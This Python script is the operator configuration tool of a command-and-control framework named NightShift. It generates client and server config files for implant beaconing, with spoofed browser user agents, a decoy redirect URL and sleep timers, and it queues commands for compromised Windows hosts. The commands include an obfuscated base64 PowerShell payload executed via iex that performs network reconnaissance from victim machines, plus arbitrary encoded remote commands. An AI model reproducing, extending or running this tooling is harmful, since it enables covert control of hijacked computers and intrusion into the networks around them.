#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import sys
from colorama import Fore, Back, Style


class NightShift_Commands():
    def nightshift_windows_commands(self):
        print(r"""
        ╔═══╗────────────────╔╗────╔╗╔╗╔╗─────╔╗
        ║╔═╗║────────────────║║────║║║║║║─────║║
        ║║─╚╬══╦╗╔╦╗╔╦══╦═╗╔═╝╠══╦╗║║║║║╠╦═╗╔═╝╠══╦╗╔╗╔╦══╗
        ║║─╔╣╔╗║╚╝║╚╝║╔╗║╔╗╣╔╗║══╬╝║╚╝╚╝╠╣╔╗╣╔╗║╔╗║╚╝╚╝║══╣
        ║╚═╝║╚╝║║║║║║║╔╗║║║║╚╝╠══╠╗╚╗╔╗╔╣║║║║╚╝║╚╝╠╗╔╗╔╬══║
        ╚═══╩══╩╩╩╩╩╩╩╝╚╩╝╚╩══╩══╩╝─╚╝╚╝╚╩╝╚╩══╩══╝╚╝╚╝╚══╝
        Commands:
        recon ---> Ping Sweep, DNS lookup and low level port scan of the endpoints neighbors
        custom ---> Enter a one line commmand
        """)
        host_cmd_404_w = str(input('Enter Command to be run on host - (default None): ') or 'None')
        
        if host_cmd_404_w == 'recon': 
            ns_clnt_cmd = "WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAE4AdgBiAFgAQgB1AFkAVwAxAGwASQBEADAAZwBXADAAVgB1AGQAbQBsAHkAYgAyADUAdABaAFcANQAwAFgAVABvADYAVABXAEYAagBhAEcAbAB1AFoAVQA1AGgAYgBXAFUATgBDAGkAUgBrAGIAbgBOAGYAYwBuAE4AcwBkAGkAQQA5AEkAQwBoAFMAWgBYAE4AdgBiAEgAWgBsAEwAVQBSAE8AVQAwADUAaABiAFcAVQBnAEwAVQA1AGgAYgBXAFUAZwBKAEcATgB2AGIAWABCAHUAWQBXADEAbABJAEMAMQAwAGUAWABCAGwASQBFAEUAcABMAGsAbABRAFEAVwBSAGsAYwBtAFYAegBjAHcAMABLAEoASABKAGwAWQAyADkAdQBYADIAcAB6AGIAMgA1AGYAWgBtAGwAdQBZAFcAdwBnAFAAUwBCAEEASwBDAGsATgBDAG0AWgB2AGMAbQBWAGgAWQAyAGcAZwBLAEMAQQBrAGEAUwBCAHAAYgBpAEEAawBaAEcANQB6AFgAMwBKAHoAYgBIAFkAZwBLAFgAcwBOAEMAaQBBAGcASQBDAEEAawBjAG0AVgBqAGIAMgA1AGYAYQBuAE4AdgBiAGkAQQA5AEkARQBBAG8ASwBRADAASwBJAEMAQQBnAEkAQwBSAHYAWQAzAFIAbABkAEMAQQA5AEkAQwBSAHAATABsAE4AdwBiAEcAbAAwAEsAQwBJAHUASQBpAGsATgBDAGkAQQBnAEkAQwBBAGsAYgAyAE4AMABaAFgAUgBmAGMAMwBSAGgAYwBuAFEAZwBQAFMAQQB4AEkAQQAwAEsASQBDAEEAZwBJAEMAUgB2AFkAMwBSAGwAZABGADkAbABiAG0AUQBnAFAAUwBBAHkATgBUAFEATgBDAGkAQQBnAEkAQwBBAGsAYgBtAFYAMABYADIATgBwAFoASABJAGcAUABTAEEAZwBKAEcAOQBqAGQARwBWADAAVwB6AEIAZABJAEMAcwBnAEoAeQA0AG4ASQBDAHMAZwBKAEcAOQBqAGQARwBWADAAVwB6AEYAZABJAEMAcwBnAEoAeQA0AG4ASQBDAHMAZwBKAEcAOQBqAGQARwBWADAAVwB6AEoAZABJAEMAcwBnAEkAaQA0AGkARABRAG8AZwBJAEMAQQBnAFoAbQA5AHkASQBDAGcAawBhAFMAQQA5AEkAQwBSAHYAWQAzAFIAbABkAEYAOQB6AGQARwBGAHkAZABEAHMAZwBKAEcAawBnAEwAVwB4AGwASQBDAFIAdgBZADMAUgBsAGQARgA5AGwAYgBtAFEANwBJAEMAUgBwAEsAeQBzAHAAZQB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAawBaAG4AVgBzAGIARgA5AHAAYwBDAEEAOQBJAEMAUgB1AFoAWABSAGYAWQAyAGwAawBjAGkAQQByAEkAQwBSAHAARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAeQBaAFcATgB2AGIAbAA5AHcAYQBXADUAbgBJAEQAMABnAFYARwBWAHoAZABDADEARABiADIANQB1AFoAVwBOADAAYQBXADkAdQBJAEMAMQBEAGIAMgAxAHcAZABYAFIAbABjAGsANQBoAGIAVwBVAGcASgBHAFoAMQBiAEcAeABmAGEAWABBAGcATABXAE4AdgBkAFcANQAwAEkARABFAGcATABWAEYAMQBhAFcAVgAwAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkARwBsAG0ASQBDAGcAawBjAG0AVgBqAGIAMgA1AGYAYwBHAGwAdQBaAHkAQQB0AGIAVwBGADAAWQAyAGcAZwBKADAAWgBoAGIASABOAGwASgB5AGwANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBCAGoAYgAyADUAMABhAFcANQAxAFoAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBCADkARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBHAGwAbQBJAEMAZwBrAGMAbQBWAGoAYgAyADUAZgBjAEcAbAB1AFoAeQBBAHQAYgBXAEYAMABZADIAZwBnAEoAMQBSAHkAZABXAFUAbgBLAFgAcwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBIAFIAeQBlAFgAcwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAFoARwA1AHoAWAAyADUAaABiAFcAVQBnAFAAUwBBAG8AVQBtAFYAegBiADIAeAAyAFoAUwAxAEUAYgBuAE4ATwBZAFcAMQBsAEkAQwAxAE8AWQBXADEAbABJAEMAUgBtAGQAVwB4AHMAWAAyAGwAdwBJAEMAMQBVAGUAWABCAGwASQBGAEIAVQBVAGkAQQB0AFIAWABKAHkAYgAzAEoAQgBZADMAUgBwAGIAMgA0AGcAVQAzAFIAdgBjAEMAawB1AFQAbQBGAHQAWgBVAGgAdgBjADMAUQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBIADAATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkARwBOAGgAZABHAE4AbwBJAEgAcwBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAFoARwA1AHoAWAAyADUAaABiAFcAVQBnAFAAUwBBAG4ASgB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAGYAUQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBaAG0AbAB1AFkAVwB4AHMAZQBTAEIANwBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBhAFcAWQBnAEsAQwBFAGsAWgBHADUAegBYADIANQBoAGIAVwBVAHAAZQB3ADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAFoARwA1AHoAWAAyADUAaABiAFcAVQBnAFAAUwBBAGkAVABtADgAdABVAG0AVgB6AGIAMgB4ADEAZABHAGwAdgBiAGkASQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQgA5AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEoASABCAHYAYwBuAFIAZgBZAFgASgB5AFkAWABrAGcAUABTAEIAQQBLAEQASQB4AEwAQwBBAHkATQBpAHcAZwBNAGoATQBzAEkARABJADEATABDAEEAMQBNAHkAdwBnAE8ARABBAHMASQBEAEUAeABNAEMAdwBnAE0AVABFAHgATABDAEEAeABNAHoAVQBzAEkARABFAHoATwBTAHcAZwBNAFQAUQB6AEwAQwBBADAATgBEAE0AcwBJAEQAUQAwAE4AUwB3AGcATwBUAGsAegBMAEMAQQA1AE8AVABVAHMASQBEAEUAMABNAHoATQBzAEkARABFADMATQBqAE0AcwBJAEQATQB6AE0ARABZAHMASQBEAE0AegBPAEQAawBzAEkARABVADUATQBEAEEAcwBJAEQAZwB3AE8ARABBAHMASQBEAGsAeABNAEQAQQBwAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEoARwA5AHcAWgBXADUAZgBjAEcAOQB5AGQASABNAGcAUABTAEIAQQBLAEMAawBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQgBtAGIAMwBKAGwAWQBXAE4AbwBJAEMAZwBrAGMARwA5AHkAZABDAEIAcABiAGkAQQBrAGMARwA5AHkAZABGADkAaABjAG4ASgBoAGUAUwBsADcARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAUgB5AFoAVwBOAHYAYgBsADkAagBiADIANQB1AFoAVwBOADAASQBEADAAZwBiAG0AVgAzAEwAVQA5AGkAYQBtAFYAagBkAEMAQgB6AGUAWABOADAAWgBXADAAdQBUAG0AVgAwAEwAbABOAHYAWQAyAHQAbABkAEgATQB1AFYARwBOAHcAUQAyAHgAcABaAFcANQAwAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAeQBaAFcATgB2AGIAbAA5AHcAYwBuAFIAZgBjAG0AVgB6AGQAVwB4ADAASQBEADAAZwBKAEgASgBsAFkAMgA5AHUAWAAyAE4AdgBiAG0ANQBsAFkAMwBRAHUAUQAyADkAdQBiAG0AVgBqAGQARQBGAHoAZQBXADUAagBLAEMAUgBtAGQAVwB4AHMAWAAyAGwAdwBMAEMAUgB3AGIAMwBKADAASwBTADUAWABZAFcAbAAwAEsARABRAHcASwBRADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQgBwAFoAaQBBAG8ASgBIAEoAbABZADIAOQB1AFgAMwBCAHkAZABGADkAeQBaAFgATgAxAGIASABRAGcATABXADEAaABkAEcATgBvAEkAQwBkAFUAYwBuAFYAbABKAHkAbAA3AEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBrAGIAMwBCAGwAYgBsADkAdwBiADMASgAwAGMAeQBBAHIAUABTAEEAawBjAEcAOQB5AGQAQQAwAEsASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEIAOQBEAFEAbwBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkARwBWAHMAYwAyAFUAZwBlAHkAQQBOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEcATgB2AGIAbgBSAHAAYgBuAFYAbABJAEEAMABLAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBCADkARABRAG8AZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcAZgBRADAASwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAFIAcQBjADIAOQB1AFgAMgBWAHMAWgBXADEAbABiAG4AUgB6AEkARAAwAGcASgAzAHMAaQBhAFgAQQBpAE8AaQBBAGkASgB5AHMAawBaAG4AVgBzAGIARgA5AHAAYwBDAHMAbgBJAGkAdwBnAEkAbQBSAHYAYgBXAEYAcABiAGkASQA2AEkAQwBJAG4ASwB5AFIAawBiAG4ATgBmAGIAbQBGAHQAWgBTAHMAbgBJAGkAdwBnAEkAbQA5AHcAWgBXADQAaQBPAGkAQQBpAEoAeQBzAGsAYgAzAEIAbABiAGwAOQB3AGIAMwBKADAAYwB5AHMAbgBJAG4AMABuAEQAUQBvAGcASQBDAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEMAQQBnAEoASABKAGwAWQAyADkAdQBYADIAcAB6AGIAMgA0AGcASwB6ADAAZwBKAEcAcAB6AGIAMgA1AGYAWgBXAHgAbABiAFcAVgB1AGQASABNAE4AQwBpAEEAZwBJAEMAQQBnAEkAQwBBAGcASQBDAEEAZwBJAEgAMABOAEMAaQBBAGcASQBDAEEAZwBJAEMAQQBnAGYAUQAwAEsASQBDAEEAZwBJAEgAMABOAEMAaQBBAGcASQBDAEEAawBjAG0AVgBqAGIAMgA1AGYAYQBuAE4AdgBiAGwAOQBtAGEAVwA1AGgAYgBDAEEAcgBQAFMAQQBrAGMAbQBWAGoAYgAyADUAZgBhAG4ATgB2AGIAZwAwAEsAZgBRADAASwBWADMASgBwAGQARwBVAHQAUwBHADkAegBkAEMAQQBrAGMAbQBWAGoAYgAyADUAZgBhAG4ATgB2AGIAbAA5AG0AYQBXADUAaABiAEEAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA="
        elif host_cmd_404_w == 'custom':
            ns_clnt_cmd_input = str(input('Enter custom one line command to be ran on host: '))
            ns_clnt_cmd = base64.b64encode(ns_clnt_cmd_input.encode('utf_16_le')).decode('utf-8')
        else:
            ns_clnt_cmd = 'None'
        return ns_clnt_cmd

    def nightshift_linux_commands(self):
        print(r"""
        ╔═══╗────────────────╔╗────╔╗
        ║╔═╗║────────────────║║────║║
        ║║─╚╬══╦╗╔╦╗╔╦══╦═╗╔═╝╠══╦╗║║──╔╦═╗╔╗╔╦╗╔╗
        ║║─╔╣╔╗║╚╝║╚╝║╔╗║╔╗╣╔╗║══╬╝║║─╔╬╣╔╗╣║║╠╬╬╝
        ║╚═╝║╚╝║║║║║║║╔╗║║║║╚╝╠══╠╗║╚═╝║║║║║╚╝╠╬╬╗
        ╚═══╩══╩╩╩╩╩╩╩╝╚╩╝╚╩══╩══╩╝╚═══╩╩╝╚╩══╩╝╚╝
        Commands:
        Future home of commands
        """)
        host_cmd_404_w = str(input('Enter Command to be run on host - (default None): ') or 'None')
        return host_cmd_404_w



def fof_conf():
    print(Fore.CYAN + r"""
    ╔═╗─╔╗───╔╗─╔╗╔═══╦╗───╔═╦╗──╔══╗─────────────────╔╗╔╗─────╔═╗╔═╗──╔╗──────╔╗─╔╗─╔═══╗╔╗
    ║║╚╗║║───║║╔╝╚╣╔═╗║║───║╔╝╚╗─║╔╗║────────────────╔╝╚╣║─────║║╚╝║║──║║──────║║╔╝╚╗║╔═╗║║║
    ║╔╗╚╝╠╦══╣╚╩╗╔╣╚══╣╚═╦╦╝╚╗╔╬╗║╚╝╚╦╗╔╦═╦═╗╔╦═╗╔══╗╚╗╔╣╚═╦══╗║╔╗╔╗╠╦═╝╠═╗╔╦══╣╚╩╗╔╝║║─║╠╣║
    ║║╚╗║╠╣╔╗║╔╗║║╚══╗║╔╗╠╬╗╔╣║╚╝║╔═╗║║║║╔╣╔╗╬╣╔╗╣╔╗║─║║║╔╗║║═╣║║║║║╠╣╔╗║╔╗╬╣╔╗║╔╗║║─║║─║╠╣║
    ║║─║║║║╚╝║║║║╚╣╚═╝║║║║║║║║╚╦╗║╚═╝║╚╝║║║║║║║║║║╚╝║─║╚╣║║║║═╣║║║║║║║╚╝║║║║║╚╝║║║║╚╗║╚═╝║║╚╗
    ╚╝─╚═╩╩═╗╠╝╚╩═╩═══╩╝╚╩╝╚╝╚═╩╝╚═══╩══╩╝╚╝╚╩╩╝╚╩═╗║─╚═╩╝╚╩══╝╚╝╚╝╚╩╩══╩╝╚╩╩═╗╠╝╚╩═╝╚═══╩╩═╝
    ──────╔═╝║───────────────────────────────────╔═╝║───────────────────────╔═╝║ 404Command
    ──────╚══╝───────────────────────────────────╚══╝───────────────────────╚══╝ version 0.9
            """)
    ns_fof_cmd_class = NightShift_Commands()
    try:
        while True:
            ns_cmd_path = "./conf/ns_fof_cmd.json"
            host_404_w = str(input('Enter Host Hash or ALL (default ALL): ') or 'ALL')
            host_os_404_w = str(input('Enter Host OS - currently available (nt/posix) (default nt): ') or 'nt')
            if host_os_404_w == 'nt':
                host_cmd_404_w = ns_fof_cmd_class.nightshift_windows_commands()
            elif host_os_404_w == 'posix':
                host_cmd_404_w = ns_fof_cmd_class.nightshift_linux_commands()
            else:
                print('OS not supported, please try again. Exiting command script.')
                sys.exit(1)
            host_slpstate_404_w = str(input('Enter 404 Client Sleep State in minutes - (default 30 - there is also an option for a random host time from 1-120 minut by entering 0): ') or '30')
            ns_cmd_config_w = { "host_404": host_404_w, "host_os_404": host_os_404_w, "host_cmd_404": host_cmd_404_w, "host_slpstate_404": int(host_slpstate_404_w) }
            print(ns_cmd_config_w)
            with open(ns_cmd_path, 'w') as ns_cmd_w:
                json.dump(ns_cmd_config_w, ns_cmd_w)
            ns_cmd_w.close()
            ns_exit_cmd = str(input('Do you want to exit (Y/N) default - N: ') or 'N')
            if ns_exit_cmd == 'N':
                continue
            else:
                print('Exiting NighShit Command')
                break
    except KeyboardInterrupt:
        print('\nInterrupted - NightShift Command exited due to a keyboard interrupt.')

def cs_conf():
    print(Fore.CYAN + r"""
    ╔═╗─╔╗───╔╗─╔╗╔═══╦╗───╔═╦╗──╔══╗─────────────────╔╗╔╗─────╔═╗╔═╗──╔╗──────╔╗─╔╗─╔═══╗╔╗
    ║║╚╗║║───║║╔╝╚╣╔═╗║║───║╔╝╚╗─║╔╗║────────────────╔╝╚╣║─────║║╚╝║║──║║──────║║╔╝╚╗║╔═╗║║║
    ║╔╗╚╝╠╦══╣╚╩╗╔╣╚══╣╚═╦╦╝╚╗╔╬╗║╚╝╚╦╗╔╦═╦═╗╔╦═╗╔══╗╚╗╔╣╚═╦══╗║╔╗╔╗╠╦═╝╠═╗╔╦══╣╚╩╗╔╝║║─║╠╣║
    ║║╚╗║╠╣╔╗║╔╗║║╚══╗║╔╗╠╬╗╔╣║╚╝║╔═╗║║║║╔╣╔╗╬╣╔╗╣╔╗║─║║║╔╗║║═╣║║║║║╠╣╔╗║╔╗╬╣╔╗║╔╗║║─║║─║╠╣║
    ║║─║║║║╚╝║║║║╚╣╚═╝║║║║║║║║╚╦╗║╚═╝║╚╝║║║║║║║║║║╚╝║─║╚╣║║║║═╣║║║║║║║╚╝║║║║║╚╝║║║║╚╗║╚═╝║║╚╗
    ╚╝─╚═╩╩═╗╠╝╚╩═╩═══╩╝╚╩╝╚╝╚═╩╝╚═══╩══╩╝╚╝╚╩╩╝╚╩═╗║─╚═╩╝╚╩══╝╚╝╚╝╚╩╩══╩╝╚╩╩═╗╠╝╚╩═╝╚═══╩╩═╝
    ──────╔═╝║───────────────────────────────────╔═╝║───────────────────────╔═╝║ 404Configure
    ──────╚══╝───────────────────────────────────╚══╝───────────────────────╚══╝ version 0.9
            """)
    try:
        while True:
            ns_c_config_path = "./conf/ns_c_config.json"
            ns_s_config_path = "./conf/ns_s_config.json"
            ns_cs_init_uri = str(input('Enter initial communication test URI - (default=/init/comms): ') or '/init/comms')
            ns_cs_init_uri_p = str(input('Enter initial client data post URI - (default=/init/comms/post): ') or '/init/comms/post')
            ns_cs_fof_uri = str(input('Enter 404 command communication URI - (default=/fof/commands): ') or '/fof/commands')
            ns_cs_data_uri_p = str(input('Enter command data output post URI - (default=/command/output): ') or '/command/output')
            ns_cs_get_ua = str(input('Enter a user agent string to be used for get methods - (default=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68): ') or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68')
            ns_cs_post_ua = str(input('Enter a user agent string to be used for post methods - (default=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68): ') or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.68')
            ns_cs_listen_port = str(input('Enter port nightshift server will listen on - (default=80): ') or '80')
            ns_s_url_redirect = str(input('Enter false redirect URLs - Server Only - (default=https://en.wikipedia.org/wiki/Botnet#Command_and_control): ') or 'https://en.wikipedia.org/wiki/Botnet#Command_and_control')
            ns_c_fqdn_ip = str(input('Enter the FQDN, IP, or DGA - Client Only - (default=DGA - currently unavailable so please enter FQDN or IP)\nexample FQDN - www.example.com\nexample IP - 1.1.1.1: '))
            ns_init_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_init_uri
            ns_initp_site_complt = 'http://' + ns_c_fqdn_ip + ':' +ns_cs_listen_port + ns_cs_init_uri_p
            ns_fof_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_fof_uri
            ns_datap_site_complt = 'http://' + ns_c_fqdn_ip + ':' + ns_cs_listen_port + ns_cs_data_uri_p
            ns_c_config_w = { "ns_init_site": ns_init_site_complt, "ns_init_site_p": ns_initp_site_complt, "ns_fof_site": ns_fof_site_complt, "ns_post_site": ns_datap_site_complt, "ns_get_ua": ns_cs_get_ua, "ns_post_ua": ns_cs_post_ua }
            ns_s_config_w = { "ns_init_suri": ns_cs_init_uri, "ns_init_surip": ns_cs_init_uri_p, "ns_fof_suri": ns_cs_fof_uri, "ns_post_suri": ns_cs_data_uri_p, "ns_get_ua": ns_cs_get_ua, "ns_post_ua": ns_cs_post_ua, "ns_aiohttp_lp": int(ns_cs_listen_port), "ns_redirect_url": ns_s_url_redirect }
            with open(ns_c_config_path, 'w') as ns_cconfig_w:
                json.dump(ns_c_config_w, ns_cconfig_w)
            ns_cconfig_w.close()
            with open(ns_s_config_path, 'w') as ns_sconfig_w:
                json.dump(ns_s_config_w, ns_sconfig_w)
            ns_sconfig_w.close()
            ns_exit_cmd = str(input('Do you want to exit (Y/N) default - N: ') or 'N')
            if ns_exit_cmd == 'N':
                continue
            else:
                print('Exiting NighShit Command')
                break
    except KeyboardInterrupt:
        print('\nInterrupted - NightShift Command exited due to a keyboard interrupt.')

if __name__ == "__main__":
    if (len(sys.argv) > 1 and (sys.argv[1] == '--cmd' or sys.argv[1] == '--conf')):
        if (sys.argv[1] == '--cmd'):
            fof_conf()
        elif  (sys.argv[1] == '--conf'):
            cs_conf()
        sys.exit(0)
    else:
        print('Usage:\npython3 nightshift_cmd_conf.py --cmd (to generate the fof c2 command)\npython3 nightshift_cmd_conf.py --conf (to generate a client/server configuration file)\n')
        sys.exit(1)
